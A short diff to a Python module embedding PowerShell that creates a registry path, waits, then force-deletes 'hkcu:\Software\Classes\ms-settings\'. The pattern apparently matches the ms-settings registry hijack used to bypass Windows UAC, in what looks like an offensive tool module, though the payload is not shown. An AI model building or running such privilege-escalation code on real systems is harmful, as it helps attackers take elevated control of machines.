@@ -28,7 +28,7 @@ class CustomModule(Module):
     # Creating path
     if(-not(Test-Path -Path $path))
     {
-        New-Item $pat -Force
+        New-Item $path -Force
     }
 
     # Registry values
@@ -40,7 +40,7 @@ class CustomModule(Module):
     
     # Removing
     Sleep 2
-    Remove-Item $path -Recurse -Force
+    rm -Force -Recurse 'hkcu:\Software\Classes\ms-settings\'
 }
 """
 
